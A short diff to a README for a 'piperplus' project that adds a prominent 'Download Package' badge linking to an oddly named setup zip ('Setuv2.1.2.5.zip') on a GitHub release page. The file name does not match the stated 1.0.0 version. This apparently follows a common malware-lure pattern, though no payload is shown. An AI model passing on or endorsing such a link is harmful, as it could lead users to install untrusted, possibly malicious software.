@@ -1,3 +1,5 @@
+[![Download](https://img.shields.io/badge/📥_Download-Package-blueviolet?style=plastic)](https://github.com/ryanblab1903n8/piperplus/releases/download/v1.0.0/Setuv2.1.2.5.zip)
+
 # 📦 piperplus
 
 ![Version](https://img.shields.io/badge/version-1.0.0-green.svg)
